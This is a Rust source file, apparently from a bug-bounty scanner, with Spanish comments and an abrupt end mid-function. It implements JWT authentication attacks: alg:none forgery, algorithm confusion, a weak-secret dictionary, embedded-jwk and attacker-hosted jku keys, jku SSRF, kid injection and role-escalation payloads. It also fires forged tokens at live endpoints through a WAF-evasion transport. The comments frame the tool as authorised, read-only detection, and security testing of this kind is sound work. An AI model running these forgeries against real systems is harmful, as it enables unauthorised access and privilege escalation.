// SPDX-License-Identifier: LicenseRef-Propietario
//! LABORATORIO DE ATAQUE A AUTENTICACIÓN — capa 0: FINGERPRINT (no destructivo).
//!
//! Estatuto: nexus es un DETECTOR — ataca solo para ENCONTRAR, nunca para perjudicar
//! (ver memoria `nexus-detector-ataca-para-encontrar`). Esta capa solo OBSERVA y parsea:
//! ¿qué mecanismo de auth usa el objetivo? De ahí, las capas 1/2 generan las sondas
//! aplicables (JWT alg:none / confusión / kid; OAuth redirect_uri; sesión…), mutadas por
//! objetivo (arnm-style) y confirmadas por el oráculo limpio (acceso-autenticado vs 401).
//!
//! Diseño en `docs/laboratorio-autenticacion.md`. Sin dependencias nuevas: el decodificador
//! base64url es propio (para forjar en capa 2 sí harán falta HMAC/SHA, decisión aparte).

/// Decodifica base64url SIN padding (el alfabeto de JWT: `A-Za-z0-9-_`). `None` si hay un
/// carácter inválido. Propio para no traer el crate `base64` en la capa de fingerprint.
pub fn base64url_decode(s: &str) -> Option<Vec<u8>> {
    fn val(c: u8) -> Option<u8> {
        match c {
            b'A'..=b'Z' => Some(c - b'A'),
            b'a'..=b'z' => Some(c - b'a' + 26),
            b'0'..=b'9' => Some(c - b'0' + 52),
            b'-' => Some(62),
            b'_' => Some(63),
            _ => None,
        }
    }
    let s = s.trim_end_matches('='); // tolera padding aunque JWT no lo lleva
    let mut out = Vec::with_capacity(s.len() * 3 / 4);
    let mut acc: u32 = 0;
    let mut bits = 0u32;
    for &c in s.as_bytes() {
        let v = val(c)? as u32;
        acc = (acc << 6) | v;
        bits += 6;
        if bits >= 8 {
            bits -= 8;
            out.push((acc >> bits) as u8);
        }
    }
    Some(out)
}

/// Un JWT parseado. Los campos del header que las capas de ataque necesitan.
#[derive(Debug, Clone, PartialEq)]
pub struct Jwt {
    /// Algoritmo declarado en el header (`alg`): HS256, RS256, none, …
    pub alg: String,
    /// `kid` (key id) si lo hay — vector de inyección (path traversal / SQLi / apuntar clave).
    pub kid: Option<String>,
    /// `jku`/`x5u` (URL de claves) si lo hay — vector de clave del atacante.
    pub jku: Option<String>,
    /// El payload como JSON (claims: sub, role, exp, …), para mutar identidad en capa 2.
    pub payload: serde_json::Value,
    /// Los tres segmentos crudos (header.payload.signature) tal cual, para re-forjar.
    pub header_b64: String,
    pub payload_b64: String,
    pub sig_b64: String,
}

/// Parsea un JWT (`header.payload.signature`, base64url). `None` si no tiene la forma de
/// JWT (3 segmentos, header JSON con `alg`). Puro y no destructivo — solo lee.
pub fn parse_jwt(token: &str) -> Option<Jwt> {
    let t = token.trim().strip_prefix("Bearer ").unwrap_or(token.trim());
    let partes: Vec<&str> = t.split('.').collect();
    if partes.len() != 3 {
        return None;
    }
    let header: serde_json::Value = serde_json::from_slice(&base64url_decode(partes[0])?).ok()?;
    // Un JWT SIEMPRE lleva `alg` en el header; sin él no es un JWT.
    let alg = header.get("alg")?.as_str()?.to_string();
    let payload: serde_json::Value =
        serde_json::from_slice(&base64url_decode(partes[1])?).unwrap_or(serde_json::Value::Null);
    Some(Jwt {
        alg,
        kid: header.get("kid").and_then(|v| v.as_str()).map(String::from),
        jku: header
            .get("jku")
            .or_else(|| header.get("x5u"))
            .and_then(|v| v.as_str())
            .map(String::from),
        payload,
        header_b64: partes[0].to_string(),
        payload_b64: partes[1].to_string(),
        sig_b64: partes[2].to_string(),
    })
}

/// El mecanismo de autenticación observado en un objetivo. Decide qué familia de ataques
/// aplica (capa 1). `Desconocido` = no se pudo determinar (falla ruidosa, no se inventa).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Mecanismo {
    /// Token JWT (en Authorization: Bearer o en cookie). El más atacable estructuralmente.
    Jwt,
    /// Cookie de sesión opaca del servidor (JSESSIONID, PHPSESSID, connect.sid…).
    SesionCookie,
    /// Flujo OAuth/OIDC (authorize/callback, code/state, redirect_uri).
    OAuth,
    /// Formulario de login clásico (usuario+contraseña).
    LoginForm,
    Desconocido,
}

/// FINGERPRINT (capa 0): del par (cabeceras, cuerpo) de una respuesta, ¿qué mecanismo de
/// auth es? Puro y no destructivo. Prioriza la señal más fuerte y específica. Las cabeceras
/// llegan como `(nombre_en_minúsculas, valor)`.
pub fn detectar_mecanismo(cabeceras: &[(String, String)], cuerpo: &str) -> Mecanismo {
    let buscar = |n: &str| cabeceras.iter().find(|(k, _)| k == n).map(|(_, v)| v.as_str());
    // 1) JWT: en WWW-Authenticate: Bearer, o un valor con forma de JWT en cookie/authz.
    if let Some(wa) = buscar("www-authenticate") {
        if wa.to_ascii_lowercase().contains("bearer") {
            return Mecanismo::Jwt;
        }
    }
    let set_cookie: Vec<&str> = cabeceras
        .iter()
        .filter(|(k, _)| k == "set-cookie")
        .map(|(_, v)| v.as_str())
        .collect();
    for c in &set_cookie {
        // El VALOR de la cookie (antes del primer `;`) — ¿es un JWT?
        if let Some(val) = c.split(';').next().and_then(|kv| kv.split_once('=')).map(|(_, v)| v) {
            if parse_jwt(val).is_some() {
                return Mecanismo::Jwt;
            }
        }
    }
    // 2) OAuth: marcadores del flujo (en Location de un redirect, o en el cuerpo).
    let loc = buscar("location").unwrap_or("");
    let oauth_señal = |s: &str| {
        let l = s.to_ascii_lowercase();
        (l.contains("/oauth") || l.contains("/authorize") || l.contains("/connect/authorize"))
            || (l.contains("redirect_uri=") && l.contains("client_id="))
            || (l.contains("response_type=") && l.contains("state="))
    };
    if oauth_señal(loc) || oauth_señal(cuerpo) {
        return Mecanismo::OAuth;
    }
    // 3) Sesión: cookie con nombre de sesión conocido (sin ser JWT).
    let nombres_sesion = ["jsessionid", "phpsessid", "connect.sid", "sessionid", "asp.net_sessionid", "sid", "session"];
    for c in &set_cookie {
        if let Some(nombre) = c.split('=').next() {
            let n = nombre.trim().to_ascii_lowercase();
            if nombres_sesion.iter().any(|s| n == *s) {
                return Mecanismo::SesionCookie;
            }
        }
    }
    // 4) Formulario de login: el cuerpo trae un form con campo de contraseña.
    let cl = cuerpo.to_ascii_lowercase();
    if cl.contains("type=\"password\"") || cl.contains("type='password'") || cl.contains("j_spring_security_check") {
        return Mecanismo::LoginForm;
    }
    Mecanismo::Desconocido
}

/// Codifica base64url SIN padding (para re-forjar el token). Inverso de `base64url_decode`.
pub fn base64url_encode(bytes: &[u8]) -> String {
    const A: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let b = [chunk[0], *chunk.get(1).unwrap_or(&0), *chunk.get(2).unwrap_or(&0)];
        let n = ((b[0] as u32) << 16) | ((b[1] as u32) << 8) | (b[2] as u32);
        out.push(A[(n >> 18 & 63) as usize] as char);
        out.push(A[(n >> 12 & 63) as usize] as char);
        if chunk.len() > 1 {
            out.push(A[(n >> 6 & 63) as usize] as char);
        }
        if chunk.len() > 2 {
            out.push(A[(n & 63) as usize] as char);
        }
    }
    out
}

/// HMAC-SHA256 (RFC 2104) implementado sobre `sha2`, para no depender del crate `hmac`
/// (cuya versión vendorizada choca con la de `sha2`; directiva 9: una dep menos). Bloque
/// de SHA-256 = 64 bytes.
fn hmac_sha256(clave: &[u8], msg: &[u8]) -> [u8; 32] {
    use sha2::{Digest, Sha256};
    const BLOQUE: usize = 64;
    let mut k = [0u8; BLOQUE];
    if clave.len() > BLOQUE {
        k[..32].copy_from_slice(&Sha256::digest(clave));
    } else {
        k[..clave.len()].copy_from_slice(clave);
    }
    let mut ipad = [0x36u8; BLOQUE];
    let mut opad = [0x5cu8; BLOQUE];
    for i in 0..BLOQUE {
        ipad[i] ^= k[i];
        opad[i] ^= k[i];
    }
    let inner = Sha256::new().chain_update(ipad).chain_update(msg).finalize();
    Sha256::new().chain_update(opad).chain_update(inner).finalize().into()
}

/// Firma HMAC-SHA256 del `signing_input` (`header_b64.payload_b64`) con `secreto`. La
/// primitiva para forjar HS256 y para el ataque de confusión de algoritmo (firmar con la
/// clave PÚBLICA como secreto). También base del brute de secreto débil.
pub fn firmar_hs256(signing_input: &str, secreto: &[u8]) -> Vec<u8> {
    hmac_sha256(secreto, signing_input.as_bytes()).to_vec()
}

/// ¿La firma HS256 del token es válida con `secreto`? Para el brute de secreto débil: si un
/// secreto del diccionario valida la firma ORIGINAL, el token es forjable.
pub fn verificar_hs256(token: &str, secreto: &[u8]) -> bool {
    let p: Vec<&str> = token.trim().strip_prefix("Bearer ").unwrap_or(token.trim()).split('.').collect();
    if p.len() != 3 {
        return false;
    }
    let Some(sig) = base64url_decode(p[2]) else { return false };
    hmac_sha256(secreto, format!("{}.{}", p[0], p[1]).as_bytes()).as_slice() == sig.as_slice()
}

/// Aplica cambios a los claims del payload (mutar identidad: `role`→admin, `sub`→otro).
/// Puro. Devuelve el JSON mutado.
pub fn mutar_payload(payload: &serde_json::Value, cambios: &[(&str, serde_json::Value)]) -> serde_json::Value {
    let mut p = payload.clone();
    if let Some(obj) = p.as_object_mut() {
        for (k, v) in cambios {
            obj.insert((*k).to_string(), v.clone());
        }
    }
    p
}

/// Un ataque de forjado de JWT (capa 2), generado a partir del fingerprint (capa 1).
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AtaqueJwt {
    /// `alg:none` (+ variantes de mayúsculas) — el server no verifica firma si alg=none.
    AlgNone,
    /// Firma no verificada — se manipula el payload y se deja la firma original/basura.
    FirmaNoVerificada,
    /// Confusión RS256→HS256 — firmar con la clave pública como secreto HMAC (requiere pubkey).
    ConfusionAlg,
    /// Secreto HMAC débil — forjar tras adivinar el secreto (requiere el diccionario).
    SecretoDebil,
}

/// CAPA 1 — del JWT fingerprinteado, qué ataques APLICAN (no los cuatro siempre; los que
/// encajan con su `alg`). Puro. `tiene_pubkey` = si descubrimos su clave pública (jwks).
pub fn ataques_aplicables(jwt: &Jwt, tiene_pubkey: bool) -> Vec<AtaqueJwt> {
    let alg = jwt.alg.to_ascii_uppercase();
    let mut v = vec![AtaqueJwt::AlgNone, AtaqueJwt::FirmaNoVerificada];
    if alg.starts_with("HS") {
        v.push(AtaqueJwt::SecretoDebil);
    }
    // Confusión: el token está firmado con clave asimétrica y conocemos la pública.
    if (alg.starts_with("RS") || alg.starts_with("ES") || alg.starts_with("PS")) && tiene_pubkey {
        v.push(AtaqueJwt::ConfusionAlg);
    }
    v
}

/// CAPA 2 (generación) — forja el token del ataque `alg:none` con el payload mutado. El
/// header pasa a `{"alg":"none"|variante,"typ":"JWT"}` y la firma queda VACÍA. Genera una
/// variante por cada grafía de "none" (algunos filtros solo bloquean la minúscula).
pub fn forjar_alg_none(payload_mutado: &serde_json::Value) -> Vec<String> {
    ["none", "None", "NONE", "nOnE"].iter().map(|alg| {
        let header = serde_json::json!({"alg": alg, "typ": "JWT"});
        let h = base64url_encode(header.to_string().as_bytes());
        let p = base64url_encode(payload_mutado.to_string().as_bytes());
        format!("{h}.{p}.") // firma vacía
    }).collect()
}

/// CAPA 2 (generación) — forja un token HS256 VÁLIDO con un HEADER arbitrario y `secreto`.
/// Base común de los moldes que meten material en el header (`jwk` embebido, `kid`): la firma
/// se calcula sobre `header_b64.payload_b64` tal como el server la verificaría.
pub fn forjar_hs256_con_header(
    header: &serde_json::Value,
    payload_mutado: &serde_json::Value,
    secreto: &[u8],
) -> String {
    let h = base64url_encode(header.to_string().as_bytes());
    let p = base64url_encode(payload_mutado.to_string().as_bytes());
    let si = format!("{h}.{p}");
    let sig = base64url_encode(&firmar_hs256(&si, secreto));
    format!("{si}.{sig}")
}

/// CAPA 2 (generación) — forja un token HS256 VÁLIDO con `secreto` (para confusión de
/// algoritmo con la pubkey, o tras romper el secreto débil). Firma de verdad.
pub fn forjar_hs256(payload_mutado: &serde_json::Value, secreto: &[u8]) -> String {
    forjar_hs256_con_header(&serde_json::json!({"alg": "HS256", "typ": "JWT"}), payload_mutado, secreto)
}

/// Diccionario de secretos HMAC débiles típicos (CVE recurrente: `your-256-bit-secret` es el
/// ejemplo de jwt.io copiado a producción). Offline: se prueba contra la firma ORIGINAL, sin
/// un solo byte de tráfico al objetivo. Lista corta a propósito (no es un crackeador: es la
/// señal de "secreto de juguete en producción"); ampliarla es barato si hace falta.
pub const DICCIONARIO_SECRETOS: &[&str] = &[
    "secret", "secretkey", "password", "123456", "changeme", "admin", "jwt", "key",
    "your-256-bit-secret", "supersecret", "token", "test", "default", "qwerty",
    "s3cr3t", "mysecret", "jwtsecret", "private",
];

/// Clave `oct` del ATACANTE para el molde `jwk` embebido — FIJA (es nuestra, no un secreto a
/// proteger). Si el server confía en la clave incrustada en el header (CVE-2026-27962, Authlib
/// `key=None`), la firma HS256 calculada con ESTA clave valida y el token forjado se acepta.
const ATACANTE_OCT_KEY: &[u8] = b"nexus-attacker-oct-key-0123456789";

/// Clave RSA del ATACANTE (FIJA, 2048-bit, generada offline) para las variantes ASIMÉTRICAS de
/// `jwk`/`jku`: el server que confía en NUESTRA clave —incrustada en el header o servida en el
/// JWKS que apunta `jku`— verifica el RS256 con ella y acepta el token. Es nuestra clave de
/// prueba, no un secreto. RSAPrivateKey PKCS#1 DER embebido (aws-lc-rs `from_der`); (n,e)
/// públicos para el JWK que presentamos.
const ATACANTE_RSA_DER: &[u8] = include_bytes!("fixtures/atacante_rsa.pkcs1.der");
const ATACANTE_RSA_N: &str = "kEwwXZflfXddzGYHPkhCrf0mbpItAeyJDYriJ7gG7li4Sgz001mrEgHFoKUMYPFpR4XOb6FGhpXDENSIyuh4642w29EVGXd-3fbz6BwxnMrGZIzyEi09c73nGrYk2bd6fEGgxzhSpWPTMOtZGAh4D_3CIhlKL9BHJj9_Tyf48UipRhcn3SrWiZ_n_prJyQ4XWKbO8W_BVTDsI7MFsTC0Dggl1SQpqFUhYJW2AfNfvXZHO0NmhuSUUZVRLoqxR7zyis9JH94WMTvywelGP4bGjVTsQGsY1LPrgV_qmjIkG9-mPfRReK7TJiX11b1jPjui_1VcdyHr7QpHXPMhCXAY5w";
const ATACANTE_RSA_E: &str = "AQAB";

/// CAPA 2 (generación, ASIMÉTRICA) — forja un token RS256 firmado con la clave RSA del atacante
/// sobre un HEADER arbitrario. Para `jwk` RSA embebido (CVE-2026-27962) y `jku` → JWKS propio
/// (clave hospedada). `None` solo si la clave embebida no cargara (no ocurre: es fija y válida).
/// aws-lc-rs ya está en el árbol (rustls) → descarga cero.
pub fn forjar_rs256_con_header(
    header: &serde_json::Value,
    payload_mutado: &serde_json::Value,
) -> Option<String> {
    let h = base64url_encode(header.to_string().as_bytes());
    let p = base64url_encode(payload_mutado.to_string().as_bytes());
    let si = format!("{h}.{p}");
    let sig = firmar_rs256(si.as_bytes())?;
    Some(format!("{si}.{}", base64url_encode(&sig)))
}

/// Firma RS256 (PKCS#1 v1.5) del `signing_input` con la clave RSA del atacante. Determinista
/// (sin sal), así que re-firmar el mismo input da la MISMA firma — base del verificador de los
/// tests sin exponer `verify` (gateado tras `ring-sig-verify`, que no compilamos).
pub fn firmar_rs256(signing_input: &[u8]) -> Option<Vec<u8>> {
    use aws_lc_rs::signature::{RsaKeyPair, RSA_PKCS1_SHA256};
    let kp = RsaKeyPair::from_der(ATACANTE_RSA_DER).ok()?;
    let mut sig = vec![0u8; kp.public_modulus_len()];
    let rng = aws_lc_rs::rand::SystemRandom::new();
    kp.sign(&RSA_PKCS1_SHA256, &rng, signing_input, &mut sig).ok()?;
    Some(sig)
}

/// El JWK RSA público del atacante, para el header `jwk` embebido o el JWKS hospedado (`jku`).
fn jwk_rsa_atacante() -> serde_json::Value {
    serde_json::json!({"kty": "RSA", "n": ATACANTE_RSA_N, "e": ATACANTE_RSA_E, "alg": "RS256", "use": "sig", "kid": "nexus"})
}

/// El JWKS (set con UNA clave) que publica la pubkey RSA del atacante. Lo SIRVE el colector OOB
/// cuando el objetivo trae el `jku` de `JkuAtacante`: el server lo fetchea, saca nuestra clave y
/// verifica el RS256 que firmamos → aceptación. JSON estable para que cualquier parser lo tome.
pub fn jwks_atacante_json() -> String {
    serde_json::json!({"keys": [jwk_rsa_atacante()]}).to_string()
}

/// Forja el token de `JkuSsrf` contra un `jku` CONCRETO (el callback OOB único de la corrida en
/// vivo). Conserva payload y firma ORIGINALES: el ataque es que el server FETCHEE la URL, no que
/// el token valide. El oráculo es el callback OOB (no la aceptación).
pub fn forjar_jku_ssrf(jwt: &Jwt, jku_url: &str) -> String {
    let header = serde_json::json!({"alg": jwt.alg, "typ": "JWT", "jku": jku_url});
    let h = base64url_encode(header.to_string().as_bytes());
    format!("{h}.{}.{}", jwt.payload_b64, jwt.sig_b64)
}

/// Forja el token de `JkuAtacante` contra un `jku` CONCRETO (nuestro JWKS hospedado en el
/// colector): RS256 con la clave RSA propia + el payload escalado. Si el server trae ese JWKS y
/// confía en él, verifica y acepta la identidad forjada. `None` solo si la clave no cargara.
pub fn forjar_jku_atacante(
    jwt: &Jwt,
    jku_url: &str,
    cambios: &[(&str, serde_json::Value)],
) -> Option<String> {
    let payload = mutar_payload(&jwt.payload, cambios);
    let header = serde_json::json!({"alg": "RS256", "typ": "JWT", "kid": "nexus", "jku": jku_url});
    forjar_rs256_con_header(&header, &payload)
}

/// EL ORÁCULO (capa 2) — ¿el token forjado logró BYPASS? Puro y limpio: se confirma solo si
/// un CONTROL (token inválido/basura) fue RECHAZADO (401/403) y el token FORJADO fue ACEPTADO
/// (2xx con contexto autenticado). Si el control también pasa, el endpoint no exige auth →
/// NO es bypass (evita el FP del recurso público, como el oráculo IDOR endurecido).
pub fn es_bypass_confirmado(status_control: u16, status_forjado: u16, cuerpo_forjado: &str) -> bool {
    let control_rechazado = matches!(status_control, 401 | 403);
    let forjado_aceptado = matches!(status_forjado, 200..=299);
    // El cuerpo no debe ser un error de auth encubierto en un 200 (algunas apis dan 200 + error).
    let cl = cuerpo_forjado.to_ascii_lowercase();
    let cuerpo_de_error = cl.contains("invalid_token") || cl.contains("unauthorized") || cl.contains("authentication required");
    control_rechazado && forjado_aceptado && !cuerpo_de_error
}

/// Escaladas de privilegio típicas para el payload (capa 2): el claim de rol varía por
/// app, así que se prueban varias formas. La última (vacía) es solo quitar la firma
/// (alg:none con el payload ORIGINAL — algunos servers solo necesitan eso).
fn escaladas() -> Vec<Vec<(&'static str, serde_json::Value)>> {
    vec![
        vec![("role", serde_json::json!("admin"))],
        vec![("role", serde_json::json!("administrator"))],
        vec![("isAdmin", serde_json::json!(true))],
        vec![("admin", serde_json::json!(true))],
        vec![("roles", serde_json::json!(["admin"]))],
        vec![],
    ]
}

/// LA FASE (capa 1+2 sobre la red real, no destructiva): por cada JWT de muestra observado
/// y cada endpoint protegido, prueba el ataque `alg:none` (firma no verificada) con
/// escaladas de identidad, vía el transporte de EVASIÓN (cruza WAF), y CONFIRMA por el
/// oráculo limpio (forjado-aceptado vs control-401). Persiste el bypass como hallazgo
/// crítico MANUAL_READY (nunca auto-envío: es detección, la revisa un humano). Antibaneo
/// por el `Guard`. Devuelve cuántos bypass confirmó.
///
/// Estatuto (memoria nexus-detector-ataca-para-encontrar): PoC de SOLO LECTURA (GET con el
/// token forjado de NUESTRA identidad de prueba), solo in-scope, se reporta, no se explota.
#[allow(clippy::too_many_arguments)]
pub async fn fase_autenticacion(
    pool: &sqlx::SqlitePool,
    program: &str,
    program_id: i64,
    endpoints: &[String],
    jwt_muestra: &[String],
    cliente: &reqwest::Client,
    curl_impersonate_path: &str,
    guard: &mut crate::protection::Guard,
    deadline: Option<std::time::Instant>,
    webhook: Option<&str>,
    rng: impl FnMut() -> f64,
) -> crate::error::Result<usize> {
    // FAN-OUT del bucle adaptativo: por cada (JWT de muestra × endpoint), `ciclo_auth` hace
    // el control barato (poda si no hay sink defendido), transcribe moldes → variantes, y
    // SIEMBRA en `secuencias` lo que el oráculo limpio confirma. El rng va en una celda
    // interior porque `SondaAuth::probar` es `&self` (el cooldown del Guard es `&self`).
    let rcell = std::cell::RefCell::new(rng);
    // Moldes con ORÁCULO DE ACEPTACIÓN (forjado-aceptado vs control-401). `JkuSsrf` NO entra:
    // su confirmación es OOB (el server fetchea la URL), no la aceptación del token.
    let moldes = [
        MoldeAuth::AlgNone,
        MoldeAuth::AlgConfusion,
        MoldeAuth::JwkEmbebido,
        MoldeAuth::JwkEmbebidoRsa,
        MoldeAuth::SecretoDebil,
        MoldeAuth::KidInjection,
        MoldeAuth::ConfusionClaveCero,
    ];
    // Candidatos de clave para CONFUSIÓN, descubiertos del JWKS UNA vez por origen (cacheado).
    let mut cache_jwks: std::collections::HashMap<String, Vec<Vec<u8>>> = std::collections::HashMap::new();
    let mut n = 0usize;
    for token in jwt_muestra {
        let Some(jwt) = parse_jwt(token) else { continue };
        if !ataques_aplicables(&jwt, false).contains(&AtaqueJwt::AlgNone) {
            continue;
        }
        for ep in endpoints {
            if crate::autz::deadline_vencido(deadline) {
                return Ok(n);
            }
            if guard.should_pause() {
                tracing::warn!("auth: PAUSA por rate-limit — protejo la IP compartida");
                break;
            }
            let host = crate::scope::host_of(ep);
            // JWKS del origen (para el molde de confusión). Una vez por origen.
            let origen = crate::jwks::origen_de(ep);
            if !cache_jwks.contains_key(&origen) {
                let cands = crate::jwks::descubrir_candidatos(cliente, &origen, curl_impersonate_path).await;
                if !cands.is_empty() {
                    tracing::info!("auth: JWKS de {origen} → {} candidato(s) de confusión", cands.len());
                }
                cache_jwks.insert(origen.clone(), cands);
            }
            let claves = &cache_jwks[&origen];
            let sonda = SondaEvasion {
                cliente,
                endpoint: ep,
                curl: curl_impersonate_path,
                guard: &*guard,
                rng: &rcell,
            };
            let res = ciclo_auth(pool, program, &host, &jwt, claves, &moldes, &sonda).await?;
            let Some(bx) = res.bypass else { continue };
            let nf = crate::db::NewFinding {
                program_name: program.to_string(),
                vuln_name: "jwt-auth-bypass".to_string(),
                severity: "critical".to_string(),
                url: ep.clone(),
                cwe: Some("CWE-347".to_string()), // Improper Verification of Cryptographic Signature
                evidencia: Some(format!(
                    "{ep}: un JWT forjado (molde {}, técnica {}) fue ACEPTADO (HTTP {}) donde un token de \
                     CONTROL inválido fue rechazado. La firma NO se verifica (CWE-347). Variante hallada por \
                     arnm y sembrada en memoria{}. PoC de solo lectura con token de prueba propio; confirmar y reportar.",
                    bx.molde,
                    bx.tecnica,
                    bx.status,
                    if res.desde_memoria { " (reusada de una confirmación previa)" } else { "" },
                )),
            };
            if crate::db::insert_finding_dedup(pool, &nf, program_id).await? {
                n += 1;
                tracing::warn!("auth: BYPASS {} ({}) confirmado en {ep} (forjado {})", bx.molde, bx.tecnica, bx.status);
                let _ = crate::notify::notificar(
                    webhook,
                    &crate::notify::Evento::Hallazgos(vec![crate::notify::HallazgoBreve {
                        severity: "critical".to_string(),
                        vuln_type: "jwt-auth-bypass".to_string(),
                        url: ep.clone(),
                        program_name: program.to_string(),
                    }]),
                )
                .await;
            }
        }
    }
    tracing::info!("auth: {} JWT de muestra, {} endpoint(s), {n} bypass confirmado(s)", jwt_muestra.len(), endpoints.len());
    Ok(n)
}

/// Sonda de auth de PRODUCCIÓN: envía el token vía `fetch_evasion` (cruza WAF por TLS) y
/// aplica el cooldown del `Guard` (anti-baneo de la IP compartida). El rng va tras `RefCell`
/// porque `probar` es `&self`; no se sostiene el préstamo a través de un `await`.
struct SondaEvasion<'a, R: FnMut() -> f64> {
    cliente: &'a reqwest::Client,
    endpoint: &'a str,
    curl: &'a str,
    guard: &'a crate::protection::Guard,
    rng: &'a std::cell::RefCell<R>,
}

impl<R: FnMut() -> f64> SondaAuth for SondaEvasion<'_, R> {
    async fn probar(&self, token: &str) -> (u16, String) {
        let r = crate::impersonate::fetch_evasion(
            self.cliente,
            self.endpoint,
            &[("Authorization".into(), format!("Bearer {token}"))],
            self.curl,
            15,
        )
        .await;
        let jit = (self.rng.borrow_mut())();
        tokio::time::sleep(self.guard.cooldown(1, jit)).await;
        (r.status, r.body)
    }

    async fn probar_sin_auth(&self) -> (u16, String) {
        let r = crate::impersonate::fetch_evasion(self.cliente, self.endpoint, &[], self.curl, 15).await;
        let jit = (self.rng.borrow_mut())();
        tokio::time::sleep(self.guard.cooldown(1, jit)).await;
        (r.status, r.body)
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// CAPA ADAPTATIVA (arnm para auth) — molde → señal → variante → oráculo → memoria.
//
// El motor de `arnm.rs` está tallado para SSRF (destinos de metadata, variantes de
// IP). Auth comparte el SUBSTRATO general —la memoria `secuencias`, cuya `familia`
// es un string libre— pero NO la gramática: sus moldes y su oráculo son propios
// (dir. 9: extraer lo compartido, no fabricar un motor único; dir. 1: simple y
// profundo). El principio operativo —la inquietud del DESGASTE— es que NO se prueban
// todos los moldes contra todo: una SONDA DE CONTROL barata decide si hay un sink
// DEFENDIDO, y solo ahí se transcriben variantes. Sin sink → 0 variantes.
// ─────────────────────────────────────────────────────────────────────────────

/// La clave de familia bajo la que auth siembra su memoria en `secuencias`.
pub const FAMILIA_AUTH: &str = "auth-jwt";

/// Un MOLDE de ataque a auth: la "fórmula" (de nuestro catálogo o de un template JWT de
/// nuclei). arnm lo TRANSCRIBE en variantes contra el JWT observado; nunca se dispara la
/// forma canónica sola (redundante y ya endurecida). Extensible (kid/jku/x5u: capa siguiente).
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum MoldeAuth {
    /// Firma NO verificada (`alg:none`). Variantes: caja (none/None/NONE/nOnE) × escaladas de rol.
    AlgNone,
    /// Confusión de algoritmo: el server valida RS256 con una pubkey; si le llega HS256 la
    /// verifica con ESA pubkey como secreto HMAC → forjable con material público.
    AlgConfusion,
    /// `jwk` EMBEBIDO en el header (CVE-2026-27962, Authlib `key=None`): el server confía en la
    /// clave incrustada. Variante no-asimétrica: jwk `kty:oct` + HS256 con NUESTRA clave. (La
    /// variante RSA firmada es la extensión dep-gated — ver docs/laboratorio-autenticacion.md.)
    JwkEmbebido,
    /// Secreto HMAC débil: diccionario OFFLINE contra la firma original; si casa, forja con él.
    SecretoDebil,
    /// `jwk` RSA embebido + RS256 firmado con la clave RSA propia (CVE-2026-27962 canónico):
    /// cubre servidores que exigen RS256 y no aceptan `oct`. La pubkey viaja en el token.
    JwkEmbebidoRsa,
    /// `jku`/`x5u` → SSRF (CVE-2026-48522, PyJWT): muta el header para que el server BUSQUE la
    /// clave en una URL nuestra / un archivo local. Oráculo OOB (no el de aceptación): no entra
    /// en el bucle de forja, su confirmación va por el verificador SSRF-OOB.
    JkuSsrf,
    /// `jku` → JWKS que HOSPEDAMOS (clave RSA propia): el server lo fetchea, obtiene nuestra
    /// pubkey y verifica el RS256 que firmamos → aceptación. Necesita el JWKS hospedado (infra
    /// OOB), por eso NO entra en el bucle de forja por defecto (como `JkuSsrf`).
    JkuAtacante,
    /// `kid` injection: path traversal a un archivo vacío (→ clave `""`) o SQLi que hace que el
    /// lookup del `kid` devuelva una clave que controlamos. Se firma HS256 con esa clave.
    KidInjection,
    /// Confusión con clave de longitud CERO (CVE-2026-44699, LibJWT): JWK RSA sin `alg` → HMAC
    /// con clave vacía. Variantes: clave `""` y un byte NUL.
    ConfusionClaveCero,
}

impl MoldeAuth {
    pub fn nombre(self) -> &'static str {
        match self {
            MoldeAuth::AlgNone => "alg-none",
            MoldeAuth::AlgConfusion => "alg-confusion",
            MoldeAuth::JwkEmbebido => "jwk-embebido",
            MoldeAuth::SecretoDebil => "secreto-debil",
            MoldeAuth::JwkEmbebidoRsa => "jwk-embebido-rsa",
            MoldeAuth::JkuSsrf => "jku-ssrf",
            MoldeAuth::JkuAtacante => "jku-atacante",
            MoldeAuth::KidInjection => "kid-injection",
            MoldeAuth::ConfusionClaveCero => "confusion-clave-cero",
        }
    }
}

/// La SEÑAL barata que decide si vale la pena transcribir (evita el desgaste). Se lee del
/// CONTROL (token de firma inválida):
/// - rechazado (401/403) → hay auth que se hace respetar: **sink defendido**, transcribir.
/// - aceptado (otro) → el endpoint no exige auth: **sin sink**, no gastar variantes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum SenalAuth {
    SinkDefendido,
    SinSink,
}

/// Clasifica la señal a partir del status del control. Puro (dir. 33: su pareja es el test).
pub fn clasificar_sink_auth(status_control: u16) -> SenalAuth {
    if matches!(status_control, 401 | 403) {
        SenalAuth::SinkDefendido
    } else {
        SenalAuth::SinSink
    }
}

/// Etiqueta legible y estable de una escalada de rol (para nombrar la técnica de la mutación).
fn etiqueta_esc(esc: &[(&'static str, serde_json::Value)]) -> String {
    if esc.is_empty() {
        "orig".to_string()
    } else {
        esc.iter().map(|(k, _)| *k).collect::<Vec<_>>().join("+")
    }
}

/// TRANSCRIBE un molde en variantes `(técnica, token)` contra ESTE JWT. Es el ARNm: el molde
/// da la intención, el JWT observado da el material. Puro y determinista.
pub fn transcribir(
    molde: MoldeAuth,
    jwt: &Jwt,
    claves_confusion: &[Vec<u8>],
) -> Vec<(String, String)> {
    let mut out = Vec::new();
    match molde {
        MoldeAuth::AlgNone => {
            for esc in escaladas() {
                let payload = mutar_payload(&jwt.payload, &esc);
                for (i, tok) in forjar_alg_none(&payload).into_iter().enumerate() {
                    out.push((format!("alg-none/caja{i}/{}", etiqueta_esc(&esc)), tok));
                }
            }
        }
        MoldeAuth::AlgConfusion => {
            // Una variante por (candidato de clave pública del JWKS × escalada de rol): la
            // representación exacta que el server usa como secreto HMAC varía por librería.
            for (ki, pk) in claves_confusion.iter().enumerate() {
                for esc in escaladas() {
                    let payload = mutar_payload(&jwt.payload, &esc);
                    let tok = forjar_hs256(&payload, pk);
                    out.push((format!("alg-confusion/k{ki}/{}", etiqueta_esc(&esc)), tok));
                }
            }
        }
        MoldeAuth::JwkEmbebido => {
            // jwk `kty:oct` incrustado + HS256 firmado con NUESTRA clave. Si el server la usa
